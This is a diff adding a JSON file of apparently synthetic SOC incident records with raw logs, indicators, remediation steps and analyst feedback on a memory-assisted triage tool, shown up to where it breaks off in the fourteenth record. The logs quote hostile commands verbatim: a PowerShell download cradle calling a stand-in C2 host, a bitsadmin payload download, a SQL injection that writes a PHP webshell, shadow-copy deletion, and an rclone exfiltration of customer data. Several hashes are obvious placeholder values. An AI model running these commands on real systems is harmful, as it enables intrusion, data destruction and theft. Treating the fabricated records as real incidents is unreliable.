@@ -1,0 +1,633 @@
+[
+  {
+    "id": "INC-2026-0801",
+    "timestamp": "2026-11-04T08:14:22Z",
+    "title": "Suspicious Encoded PowerShell Execution on Finance Workstation",
+    "alert_type": "Suspicious PowerShell execution",
+    "severity": "High",
+    "affected_host": "FIN-WKS-042",
+    "user": "corp\\jdoe",
+    "description": "EDR detected powershell.exe spawned by EXCEL.EXE with base64-encoded command line attempting to download external payload from suspicious domain.",
+    "raw_logs": "EventID: 4688\nProcessName: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nCommandLine: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AZQB2AGkAbABkAG8AbQBhAGkAbgAuAHgAeQB6AC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==\nParentProcess: EXCEL.EXE (PID: 8432)\nTargetIP: 198.51.100.44:8080",
+    "indicators": {
+      "ips": ["198.51.100.44"],
+      "domains": ["c2.evildomain.xyz"],
+      "hashes": ["7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069"],
+      "processes": ["EXCEL.EXE", "powershell.exe"],
+      "mitre_techniques": ["T1059.001", "T1204.002", "T1071.001"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "High", "action": "Decode Base64 payload and extract C2 endpoint", "reason": "Identify command and control server to block at edge perimeter", "evidence": "PowerShell command line", "expected_result": "Revealed staging URL c2.evildomain.xyz/payload.ps1"},
+      {"step": 2, "priority": "High", "action": "Isolate FIN-WKS-042 from corporate subnet", "reason": "Prevent lateral movement through SMB/WinRM", "evidence": "EDR isolation command", "expected_result": "Host isolated with network quarantine rule"},
+      {"step": 3, "priority": "Medium", "action": "Inspect user's Outlook inbox for weaponized attachment", "reason": "Determine weaponized email delivery vector", "evidence": "Message-ID and invoice.xlsm header", "expected_result": "Phishing email found from vendor-spoof@acme-supplier.com"}
+    ],
+    "root_cause": "Malicious macro-enabled Excel sheet delivered via spear-phishing impersonating an invoice attachment.",
+    "remediation": "Endpoint isolated via EDR, firewall perimeter blocked 198.51.100.44 and *.evildomain.xyz, user mailbox purged of phishing messages, user credentials revoked and reset.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The suggested memory retrieval of past invoice macro incidents accelerated our triage from 35 mins down to 6 mins.",
+      "analyst_id": "analyst_sec_04"
+    },
+    "lessons_learned": "Enforce strict Microsoft Office macro-blocking policy via GPO for all external attachments across finance and HR units."
+  },
+  {
+    "id": "INC-2026-0802",
+    "timestamp": "2026-11-04T09:30:15Z",
+    "title": "Multiple Failed Kerberos Pre-Authentication Attempts (Password Spraying)",
+    "alert_type": "Brute-force login attempts",
+    "severity": "Medium",
+    "affected_host": "DC-PRIMARY-01",
+    "user": "multiple (48 accounts)",
+    "description": "Domain controller recorded Event ID 4771 with Failure Code 0x18 across 48 domain accounts within 12 minutes coming from a single internal VPN IP.",
+    "raw_logs": "EventID: 4771\nServiceName: krbtgt/CORP.LOCAL\nTargetUserName: svc_backup, jsmith, mross, dclark, bwayne...\nFailureCode: 0x18 (Pre-authentication information was invalid)\nClientAddress: 10.240.12.88\nLogonType: 3 (Network)",
+    "indicators": {
+      "ips": ["10.240.12.88"],
+      "domains": ["corp.local"],
+      "hashes": [],
+      "processes": ["lsass.exe"],
+      "mitre_techniques": ["T1110.003", "T1558.003"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "High", "action": "Correlate VPN session for internal IP 10.240.12.88", "reason": "Identify the compromised VPN user credential", "evidence": "RADIUS / VPN authentication logs", "expected_result": "Assigned to contractor account 'ext_consultant_02'"},
+      {"step": 2, "priority": "High", "action": "Check if any sprayed accounts succeeded authentication", "reason": "Determine breach boundary and potential lateral movement", "evidence": "Event ID 4768 / 4624 filters", "expected_result": "One account 'svc_printer' succeeded"},
+      {"step": 3, "priority": "Medium", "action": "Lock compromised accounts and terminate active VPN tunnel", "reason": "Sever attacker access path", "evidence": "Active Directory lockout logs", "expected_result": "Tunnel dropped, accounts disabled"}
+    ],
+    "root_cause": "Compromised contractor VPN credentials used to execute horizontal password spray against Active Directory.",
+    "remediation": "Terminated active VPN session, reset passwords for ext_consultant_02 and svc_printer, enforced MFA for all contractor VPN groups.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Accurately correlated Event 4771 code 0x18 with historical Kerberos spray playbook.",
+      "analyst_id": "analyst_sec_01"
+    },
+    "lessons_learned": "Enforce MFA unconditionally on legacy VPN pools and decommission outdated service accounts with password expiration disabled."
+  },
+  {
+    "id": "INC-2026-0803",
+    "timestamp": "2026-11-04T11:45:00Z",
+    "title": "Shadow Copy Deletion & Suspicious File Renaming (Ransomware Pre-Execution)",
+    "alert_type": "Ransomware behavior",
+    "severity": "Critical",
+    "affected_host": "FILESRV-BACKUP-02",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "description": "High-fidelity alert triggered by vssadmin.exe delete shadows /all /quiet execution followed by sudden entropy spike and mass file extension changes to .encrypX.",
+    "raw_logs": "Process: C:\\Windows\\System32\\vssadmin.exe\nArgs: delete shadows /all /quiet\nParent: bcdedit.exe /set {default} recoveryenabled No\nFollowup: wmic shadowcopy delete\nPath: D:\\SharedData\\Projects\\* -> *.encrypX\nIOC Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+    "indicators": {
+      "ips": ["203.0.113.78"],
+      "domains": ["decrypt-support.onion.ws"],
+      "hashes": ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"],
+      "processes": ["vssadmin.exe", "bcdedit.exe", "wmic.exe", "svchost32.exe"],
+      "mitre_techniques": ["T1490", "T1486", "T1082"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "Critical", "action": "Execute immediate hardware network port shutdown / hypervisor NIC disconnection", "reason": "Halt active file encryption spreading to mounted shares", "evidence": "Hypervisor network toggle", "expected_result": "FILESRV-BACKUP-02 isolated at L2"},
+      {"step": 2, "priority": "Critical", "action": "Snapshot memory state of host for volatile artifact preservation", "reason": "Capture encryption keys in RAM if unfinalized", "evidence": "VM memory dump .vmem", "expected_result": "Volatile memory saved for DFIR dump"},
+      {"step": 3, "priority": "High", "action": "Verify immutable offline and cloud backup integrity", "reason": "Ensure clean recovery points exist", "evidence": "Veeam immutable bucket verification", "expected_result": "Air-gapped backups from 02:00 UTC verified pristine"}
+    ],
+    "root_cause": "BlackCat/ALPHV ransomware variant executed through scheduled task injected via compromised domain admin credential.",
+    "remediation": "Hypervisor level isolation, restored volume from immutable snapshot, rotated Enterprise Admin credentials, rebuilt host from pristine golden image.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The immediate containment warning prevented file share propagation. Memory retention of vssadmin deletion pattern matches Q3 incidents.",
+      "analyst_id": "analyst_sec_09"
+    },
+    "lessons_learned": "Disable VSS deletion permissions for non-backup software agents and implement canary file honeypots on all NAS volumes."
+  },
+  {
+    "id": "INC-2026-0804",
+    "timestamp": "2026-11-04T13:20:10Z",
+    "title": "Anomalous Outbound Beaconing to Untrusted Autonomous System (C2 Activity)",
+    "alert_type": "Suspicious outbound connections",
+    "severity": "High",
+    "affected_host": "DEV-SRV-LINUX-09",
+    "user": "www-data",
+    "description": "Network traffic analyzer identified regular HTTPS POST requests every 45 seconds (+/- 5% jitter) to Russian hosting provider with small fixed payload lengths.",
+    "raw_logs": "Protocol: TLSv1.3\nSrcIP: 10.100.4.15:44392\nDstIP: 185.220.101.5:443\nDstAS: AS49453 (Global Telecommunication)\nInterval: 45.1s, 44.8s, 45.3s, 45.0s (Jitter 0.05)\nJA3 Fingerprint: e7d705a3286e19ea42f587b344ee6865\nProcess: /tmp/.systemd-worker",
+    "indicators": {
+      "ips": ["185.220.101.5"],
+      "domains": ["cdn-update-sync.online"],
+      "hashes": ["9f83c1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9011"],
+      "processes": [".systemd-worker", "curl", "nohup"],
+      "mitre_techniques": ["T1071.001", "T1041", "T1036.005"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "High", "action": "Terminate PID associated with hidden executable /tmp/.systemd-worker", "reason": "Kill live outbound C2 channel", "evidence": "Process table & lsof -i", "expected_result": "Process terminated, network socket closed"},
+      {"step": 2, "priority": "High", "action": "Collect binary /tmp/.systemd-worker for reverse engineering", "reason": "Extract hardcoded config and secondary C2 fallback domains", "evidence": "SHA256 calculation and strings extraction", "expected_result": "Identified Sliver C2 implant"},
+      {"step": 3, "priority": "Medium", "action": "Trace parent process lineage back to initial entry point", "reason": "Find vulnerability exploited to create /tmp executable", "evidence": "Nginx access log & auditd", "expected_result": "Identified POST exploit on /api/v1/render endpoint"}
+    ],
+    "root_cause": "Sliver C2 framework dropped via unauthenticated RCE on internal development microservice.",
+    "remediation": "C2 IP blocked on egress Palo Alto firewall, implant purged, web application patched against command injection vulnerability, server redeployed in isolated DMZ.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Detection of JA3 fingerprint matches our earlier memory entry from the penetration test repository.",
+      "analyst_id": "analyst_sec_02"
+    },
+    "lessons_learned": "Enforce strict egress filtering blocking outbound traffic from application tiers directly to untrusted public IP ranges."
+  },
+  {
+    "id": "INC-2026-0805",
+    "timestamp": "2026-11-04T15:10:45Z",
+    "title": "Scheduled Task Persistence Created via Schtasks with SYSTEM Privileges",
+    "alert_type": "Malware persistence",
+    "severity": "Medium",
+    "affected_host": "HR-WORKSTATION-14",
+    "user": "corp\\jdoe",
+    "description": "Windows Security Event 4698 logged creation of scheduled task named 'OneDriveHealthCheck' executing a script located in C:\\Users\\Public\\Videos.",
+    "raw_logs": "EventID: 4698\nTaskName: \\Microsoft\\Windows\\OneDriveHealthCheck\nAction: C:\\Windows\\System32\\cmd.exe /c C:\\Users\\Public\\Videos\\update.vbs\nSchedule: At logon of any user\nRunLevel: HighestAvailable",
+    "indicators": {
+      "ips": [],
+      "domains": [],
+      "hashes": ["5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"],
+      "processes": ["schtasks.exe", "cmd.exe", "wscript.exe"],
+      "mitre_techniques": ["T1053.005", "T1036.004"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "High", "action": "Inspect contents of C:\\Users\\Public\\Videos\\update.vbs", "reason": "Determine payload functionality and secondary downloads", "evidence": "File content review", "expected_result": "Found obfuscated VBScript invoking certutil.exe"},
+      {"step": 2, "priority": "High", "action": "Delete malicious scheduled task 'OneDriveHealthCheck'", "reason": "Eliminate reboot persistence mechanism", "evidence": "schtasks /delete command output", "expected_result": "Task successfully removed"},
+      {"step": 3, "priority": "Low", "action": "Scan all workstations for similar tasks in C:\\Users\\Public", "reason": "Check for organizational sprawl", "evidence": "Fleet-wide osquery hunt", "expected_result": "No other endpoints affected"}
+    ],
+    "root_cause": "Malware persistence established following execution of malicious email link.",
+    "remediation": "Task removed, VBScript quarantined, user trained on link safety, Public folder execution restricted via AppLocker.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Clear step-by-step remediation plan.",
+      "analyst_id": "analyst_sec_03"
+    },
+    "lessons_learned": "Block script execution (vbs, js, bat) from world-writable directories such as C:\\Users\\Public via AppLocker policy."
+  },
+  {
+    "id": "INC-2026-0806",
+    "timestamp": "2026-11-04T16:05:12Z",
+    "title": "Privilege Escalation via Potato Exploit on IIS Web Server",
+    "alert_type": "Privilege escalation indicators",
+    "severity": "Critical",
+    "affected_host": "WEB-FRONTEND-01",
+    "user": "IIS APPPOOL\\DefaultAppPool",
+    "description": "EDR detected creation of privileged token using GodPotato exploit against local RPC endpoint to elevate from service account to NT AUTHORITY\\SYSTEM.",
+    "raw_logs": "Alert: Suspicious Token Impersonation\nProcess: C:\\inetpub\\temp\\gp.exe\nPrivilege: SeImpersonatePrivilege enabled\nRPC Binding: ncacn_np:localhost[\\pipe\\epmapper]\nTarget Identity: NT AUTHORITY\\SYSTEM\nParent: w3wp.exe (PID: 3210)",
+    "indicators": {
+      "ips": ["192.0.2.144"],
+      "domains": [],
+      "hashes": ["ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"],
+      "processes": ["w3wp.exe", "gp.exe", "cmd.exe"],
+      "mitre_techniques": ["T1068", "T1134.001", "T1190"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "Critical", "action": "Quarantine WEB-FRONTEND-01 from production DMZ", "reason": "Prevent pivot from DMZ into internal database tier", "evidence": "Network isolation", "expected_result": "Traffic dropped to database segment"},
+      {"step": 2, "priority": "High", "action": "Analyze IIS web logs for webshell interaction prior to execution", "reason": "Identify webshell entry point and remote attacker IP", "evidence": "C:\\inetpub\\logs\\LogFiles\\W3SVC1", "expected_result": "Identified POST requests to /uploads/logo.aspx from 192.0.2.144"},
+      {"step": 3, "priority": "High", "action": "Remove file gp.exe and logo.aspx", "reason": "Eradicate exploit binary and webshell", "evidence": "Forensic hash verification", "expected_result": "Files deleted from filesystem"}
+    ],
+    "root_cause": "Unrestricted file upload vulnerability allowed .aspx webshell upload, followed by GodPotato privilege escalation using SeImpersonatePrivilege.",
+    "remediation": "Removed webshell and exploit binaries, removed SeImpersonatePrivilege from IIS worker pool, applied file extension whitelist on upload endpoint.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The Hindsight retrieval remembered a similar SeImpersonatePrivilege incident from 2 months ago, suggesting exact GPO removal command.",
+      "analyst_id": "analyst_sec_01"
+    },
+    "lessons_learned": "Strip SeImpersonatePrivilege from web service accounts and configure IIS to refuse execution permissions in upload directories."
+  },
+  {
+    "id": "INC-2026-0807",
+    "timestamp": "2026-11-04T18:40:30Z",
+    "title": "Impossible Travel Alert: Concurrent Logins from USA and Romania",
+    "alert_type": "Unusual account activity",
+    "severity": "Medium",
+    "affected_host": "AZURE-AD-IDENTITY",
+    "user": "sarah.connor@cybermemory.ai",
+    "description": "Entra ID Identity Protection flagged risk event: Authenticated session in New York, US followed 14 minutes later by session from Bucharest, RO (distance 7,600 km).",
+    "raw_logs": "Event: UserRiskEvent\nUser: sarah.connor@cybermemory.ai\nEvent 1: 18:26:10 UTC | IP: 104.28.19.12 (New York, US) | Client: Safari MacOS\nEvent 2: 18:40:24 UTC | IP: 188.24.11.90 (Bucharest, RO) | Client: Chrome Windows\nRiskLevel: High\nApp: Microsoft 365 Exchange Online",
+    "indicators": {
+      "ips": ["104.28.19.12", "188.24.11.90"],
+      "domains": [],
+      "hashes": [],
+      "processes": [],
+      "mitre_techniques": ["T1078.004", "T1539"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "High", "action": "Contact employee via verified phone channel", "reason": "Determine if user initiated second session via commercial VPN", "evidence": "Phone confirmation notes", "expected_result": "User confirmed being in New York; did not recognize Romania login"},
+      {"step": 2, "priority": "High", "action": "Revoke all active Azure AD OAuth refresh tokens", "reason": "Kill hijacked session token instantly", "evidence": "Revoke-AzureADUserAllRefreshToken output", "expected_result": "All sessions terminated"},
+      {"step": 3, "priority": "Medium", "action": "Audit mailbox forwarding rules and inbox rules", "reason": "Check if attacker created auto-forwarding rule for business email compromise", "evidence": "Exchange Online audit logs", "expected_result": "Found rule forwarding invoices to external gmail address"}
+    ],
+    "root_cause": "Session token stolen via adversary-in-the-middle (AiTM) phishing proxy that bypassed standard MFA.",
+    "remediation": "Tokens invalidated, malicious forwarding rule deleted, account password reset, enrolled user in FIDO2 hardware token program.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The prompt to check mailbox forwarding rules was crucial—we almost missed the stealthy inbox rule.",
+      "analyst_id": "analyst_sec_06"
+    },
+    "lessons_learned": "Transition all critical accounts from SMS/app-based MFA to FIDO2 / Passkey phishing-resistant authentication."
+  },
+  {
+    "id": "INC-2026-0808",
+    "timestamp": "2026-11-04T20:15:10Z",
+    "title": "Suspected Data Exfiltration: 48 GB Uploaded via Rclone to AWS S3",
+    "alert_type": "Data exfiltration indicators",
+    "severity": "Critical",
+    "affected_host": "ENG-STORAGE-NODE-03",
+    "user": "root",
+    "description": "Network flow monitor alerted on continuous 800 Mbps outbound connection from sensitive storage node to unexpected Amazon S3 bucket not belonging to company organization.",
+    "raw_logs": "Protocol: HTTPS (TCP 443)\nSrcIP: 10.20.5.12\nDstIP: 52.216.142.9 (s3-us-west-2.amazonaws.com)\nPayloadSize: 48.7 Gigabytes in 42 minutes\nProcess: /usr/local/bin/rclone copy /var/data/customer_vault/ remote:data-dump-bucket-912 --transfers 16",
+    "indicators": {
+      "ips": ["52.216.142.9"],
+      "domains": ["s3-us-west-2.amazonaws.com"],
+      "hashes": ["2c624232cdd221771294dfbb310aca000a0df6ec9b5feb9807f4069a868b0f03"],
+      "processes": ["rclone", "sh", "cron"],
+      "mitre_techniques": ["T1567.002", "T1048", "T1074.001"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "Critical", "action": "Kill rclone PID and block outbound AWS S3 endpoints temporarily", "reason": "Stop ongoing data theft in real time", "evidence": "kill -9 command & iptables drop", "expected_result": "Transfer halted at 48 GB out of 250 GB target"},
+      {"step": 2, "priority": "High", "action": "Retrieve rclone configuration file (~/.config/rclone/rclone.conf)", "reason": "Identify destination bucket owner and access key IDs", "evidence": "AWS Access Key ID AKIA...", "expected_result": "Found attacker AWS account ID 892184918231"},
+      {"step": 3, "priority": "High", "action": "Submit urgent abuse report to AWS Trust & Safety", "reason": "Request immediate freeze of receiving bucket and preservation of attacker audit logs", "evidence": "AWS Abuse Case #849102", "expected_result": "Bucket frozen by AWS within 2 hours"}
+    ],
+    "root_cause": "Compromised SSH root private key used by adversary to stage and exfiltrate customer database dump via rclone.",
+    "remediation": "Network connection dropped, SSH keys replaced with certificate-based short-lived access, incident reported to data privacy officer, forensic image created.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The suggested step of extracting rclone.conf gave us the exact AWS key to freeze the exfiltration target.",
+      "analyst_id": "analyst_sec_01"
+    },
+    "lessons_learned": "Implement cloud egress proxy restricting S3 access only to whitelisted corporate AWS VPC endpoints."
+  },
+  {
+    "id": "INC-2026-0809",
+    "timestamp": "2026-11-04T22:11:00Z",
+    "title": "SQL Injection & Webshell Drop on Legacy Customer Portal",
+    "alert_type": "Web server compromise",
+    "severity": "High",
+    "affected_host": "PORTAL-VM-01",
+    "user": "apache",
+    "description": "WAF triggered on stacked SQL query injected into 'customer_id' parameter, followed by creation of obfuscated PHP file inside /var/www/html/assets/css/.",
+    "raw_logs": "URI: /billing/view.php?customer_id=102' UNION SELECT 1,'<?php @eval($_POST[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/assets/css/style.min.php'-- -\nStatus: 200 OK\nIP: 45.154.255.89\nReferer: None\nUser-Agent: sqlmap/1.7#stable",
+    "indicators": {
+      "ips": ["45.154.255.89"],
+      "domains": [],
+      "hashes": ["7d793037a0760186574b0282f2f435e7"],
+      "processes": ["httpd", "sh", "curl"],
+      "mitre_techniques": ["T1190", "T1505.003", "T1059.004"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "High", "action": "Delete webshell /var/www/html/assets/css/style.min.php", "reason": "Prevent remote command execution through HTTP POST", "evidence": "File deletion and MD5 verification", "expected_result": "Webshell removed"},
+      {"step": 2, "priority": "High", "action": "Patch vulnerable SQL query in /billing/view.php with prepared statements", "reason": "Close injection vulnerability", "evidence": "Git commit diff using PDO parameterized queries", "expected_result": "SQL injection closed"},
+      {"step": 3, "priority": "Medium", "action": "Review database query logs for exfiltrated tables", "reason": "Determine if user records were dumped prior to webshell drop", "evidence": "MySQL general query log", "expected_result": "Confirmed schema probe only, no bulk table dump"}
+    ],
+    "root_cause": "Legacy PHP application missing parameter binding allowed UNION SELECT INTO OUTFILE webshell injection.",
+    "remediation": "Webshell removed, application converted to PDO prepared statements, WAF rule set from Detect to Block mode, IP 45.154.255.89 blacklisted.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Immediate detection of sqlmap user agent and file creation pattern.",
+      "analyst_id": "analyst_sec_04"
+    },
+    "lessons_learned": "Enforce WAF virtual patching and migrate legacy PHP scripts to modern ORM frameworks."
+  },
+  {
+    "id": "INC-2026-0810",
+    "timestamp": "2026-11-05T01:15:33Z",
+    "title": "DevOps Automated Backup Script Flagged as Ransomware",
+    "alert_type": "Ransomware behavior",
+    "severity": "Low",
+    "affected_host": "DEV-BACKUP-01",
+    "user": "svc-backup",
+    "description": "SOC alert raised for high file modification rate and 7-zip command line encryption on internal non-production database dumps.",
+    "raw_logs": "Alert: Mass File Encryption Detected\nProcess: 7z.exe a -p***** -mhe=on D:\\Backups\\db_nightly.7z D:\\Databases\\*.sql\nFileCount: 420 files renamed/compressed in 180 seconds\nUser: corp\\svc-backup",
+    "indicators": {
+      "ips": [],
+      "domains": [],
+      "hashes": ["a1b2c3d4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef"],
+      "processes": ["7z.exe", "backup_routine.bat"],
+      "mitre_techniques": ["T1486"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "Low", "action": "Cross-reference scheduled task 'NightlyDatabaseBackup' with IT change management ticket", "reason": "Verify if activity is legitimate scheduled IT operation", "evidence": "Jira ticket IT-8921 approved by DevOps Lead", "expected_result": "Confirmed planned encryption of backup archives"},
+      {"step": 2, "priority": "Low", "action": "Verify digital signature of 7z.exe", "reason": "Ensure legitimate 7-zip binary without trojan modification", "evidence": "Authenticode signature valid from Igor Pavlov", "expected_result": "Signature verified"}
+    ],
+    "root_cause": "Legitimate automated nightly compression and encryption script triggered generic heuristic ransomware detection rule.",
+    "remediation": "Updated EDR detection policy to exclude whitelisted backup service account executing signed 7-zip binaries inside D:\\Backups.",
+    "final_outcome": "False Positive",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Great correlation with historical false positive patterns. Avoided unnecessary middle-of-the-night incident escalation.",
+      "analyst_id": "analyst_sec_07"
+    },
+    "lessons_learned": "Tune SOC behavioral detection rules to account for authorized administrative tools using strong encryption."
+  },
+  {
+    "id": "INC-2026-0811",
+    "timestamp": "2026-11-05T03:40:19Z",
+    "title": "Suspicious PowerShell Downloading Script via BITSAdmin",
+    "alert_type": "Suspicious PowerShell execution",
+    "severity": "Medium",
+    "affected_host": "CORP-WKS-109",
+    "user": "corp\\mkumar",
+    "description": "BITSAdmin and PowerShell used in tandem to download remote binary file into AppData directory, bypassing conventional browser download monitoring.",
+    "raw_logs": "Process: bitsadmin.exe /transfer myJob /download /priority normal http://update-telemetry.services/agent.exe %APPDATA%\\agent.exe\nParent: powershell.exe -WindowStyle Hidden -Command Start-Process bitsadmin.exe...",
+    "indicators": {
+      "ips": ["198.51.100.99"],
+      "domains": ["update-telemetry.services"],
+      "hashes": ["4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a"],
+      "processes": ["powershell.exe", "bitsadmin.exe"],
+      "mitre_techniques": ["T1197", "T1059.001"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "High", "action": "Terminate active BITS transfer job", "reason": "Stop pending file retrieval", "evidence": "bitsadmin /cancel myJob", "expected_result": "Job aborted"},
+      {"step": 2, "priority": "High", "action": "Block update-telemetry.services on DNS sinkhole", "reason": "Prevent repeated download attempts", "evidence": "Pi-hole / DNS firewall log", "expected_result": "Domain resolved to 0.0.0.0"}
+    ],
+    "root_cause": "User clicked on fake browser update prompt that initiated silent background BITS transfer.",
+    "remediation": "Downloaded binary deleted, BITS job purged, browser extensions audited and wiped.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "The memory bank recalled similar BITS abuse from previous month.",
+      "analyst_id": "analyst_sec_05"
+    },
+    "lessons_learned": "Restrict BITSAdmin execution to domain administrative accounts via GPO Software Restriction Policies."
+  },
+  {
+    "id": "INC-2026-0812",
+    "timestamp": "2026-11-05T05:22:40Z",
+    "title": "Phishing Email with SVG Smuggling Attachment Targeting Executives",
+    "alert_type": "Phishing and malicious attachments",
+    "severity": "High",
+    "affected_host": "CEO-LAPTOP-01",
+    "user": "corp\\ceo_office",
+    "description": "Email gateway bypassed by HTML/SVG attachment embedding base64 JavaScript blob that dynamically reconstructed malicious ISO on client machine without network download.",
+    "raw_logs": "Subject: Board of Directors Meeting Minutes - Confidential.svg\nAttachment: minutes.svg\nEmbeddedBlob: data:application/octet-stream;base64,TVqQAAMAAAAEAAAA//8AALgAAAAAAA...\nDOM Action: window.URL.createObjectURL(blob); link.click()",
+    "indicators": {
+      "ips": [],
+      "domains": ["secure-portal-board.com"],
+      "hashes": ["99c8a7b6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f9a8"],
+      "processes": ["chrome.exe", "explorer.exe"],
+      "mitre_techniques": ["T1027.006", "T1566.001"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "High", "action": "Search email gateway logs for minutes.svg across entire company", "reason": "Find all recipients of targeted spear-phishing wave", "evidence": "O365 Message Trace", "expected_result": "5 executive inboxes found with identical email"},
+      {"step": 2, "priority": "High", "action": "Purge emails from mailboxes via Graph API compliance search", "reason": "Prevent accidental execution by other leaders", "evidence": "Hard-delete purge confirmation", "expected_result": "Messages purged before opening"}
+    ],
+    "root_cause": "HTML/SVG smuggling technique evaded static secure email gateway antivirus filters.",
+    "remediation": "Rule updated in SEG to block or detonate inbound attachments containing embedded SVG/HTML script tags.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Hindsight provided exact regex to identify SVG smuggling markers in gateway logs.",
+      "analyst_id": "analyst_sec_03"
+    },
+    "lessons_learned": "Enforce strict attachment sandboxing and disallow direct HTML/SVG attachments from external sources."
+  },
+  {
+    "id": "INC-2026-0813",
+    "timestamp": "2026-11-05T07:14:02Z",
+    "title": "Suspicious DNS Tunneling Query Volume to Non-Existent TLD",
+    "alert_type": "Suspicious outbound connections",
+    "severity": "High",
+    "affected_host": "DNS-CACHE-SERVER-02",
+    "user": "system",
+    "description": "SIEM detected over 14,000 sub-queries to randomly generated subdomains of *.exfil-telemetry-cdn.biz within 15 minutes with high entropy TXT records.",
+    "raw_logs": "DNS Query Type: TXT\nQueries: \n - 01a9f3b89c.exfil-telemetry-cdn.biz\n - 0288d7c2a1.exfil-telemetry-cdn.biz\n - 03ee5519ab.exfil-telemetry-cdn.biz\nEntropy: 4.82 (High)\nSrcIP: 10.150.3.40 (Workstation Marketing-12)",
+    "indicators": {
+      "ips": ["198.18.0.22"],
+      "domains": ["exfil-telemetry-cdn.biz"],
+      "hashes": [],
+      "processes": ["nslookup.exe", "iodine"],
+      "mitre_techniques": ["T1071.004", "T1048.003"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "High", "action": "Implement immediate Response Policy Zone (RPZ) block for *.exfil-telemetry-cdn.biz", "reason": "Cut DNS data channel immediately", "evidence": "Bind9 RPZ drop zone", "expected_result": "Queries return NXDOMAIN"},
+      {"step": 2, "priority": "High", "action": "Isolate host Marketing-12 (10.150.3.40)", "reason": "Inspect local process executing raw DNS socket requests", "evidence": "EDR process tree", "expected_result": "Host quarantined"}
+    ],
+    "root_cause": "DNS tunneling utility (Iodine/dnscat) used to bypass outbound web proxy and exfiltrate internal documents.",
+    "remediation": "RPZ block created, host isolated and wiped, DNS query length limits configured on recursive resolvers.",
+    "final_outcome": "Confirmed Malicious",
+    "analyst_feedback": {
+      "rating": "Helpful",
+      "comments": "Entropy thresholding calculation matched our memory baseline.",
+      "analyst_id": "analyst_sec_01"
+    },
+    "lessons_learned": "Enable DNS inspection with entropy scoring on core recursive resolvers to detect sub-label data smuggling."
+  },
+  {
+    "id": "INC-2026-0814",
+    "timestamp": "2026-11-05T09:00:25Z",
+    "title": "WMI Event Subscription Established for Stealthy Boot Persistence",
+    "alert_type": "Malware persistence",
+    "severity": "Medium",
+    "affected_host": "DB-PROD-REPLICA-01",
+    "user": "NT AUTHORITY\\SYSTEM",
+    "description": "Sysmon Event 19, 20, 21 detected __EventFilter and CommandLineEventConsumer created to execute powershell script upon machine boot.",
+    "raw_logs": "EventID: 19 (WmiEvent - WmiEventFilter activity detected)\nName: BckHealthFilter\nQuery: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\nConsumer: CommandLineEventConsumer.Name=\"BckHealthConsumer\"\nCommandLine: powershell -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA... ",
+    "indicators": {
+      "ips": [],
+      "domains": [],
+      "hashes": ["33a4b5c6d7e8f901234567890abcdef1234567890abcdef1234567890abcdef1"],
+      "processes": ["scrcons.exe", "powershell.exe"],
+      "mitre_techniques": ["T1546.003"]
+    },
+    "investigation_steps": [
+      {"step": 1, "priority": "High", "action": "Delete WMI Filter and Consumer using Get-CimInstance and Remove-CimInstance", "reason": "Eradicate persistent WMI trigger", "evidence": "PowerShell CIM commands", "expected_result": "WMI namespace root/subscription purged"},
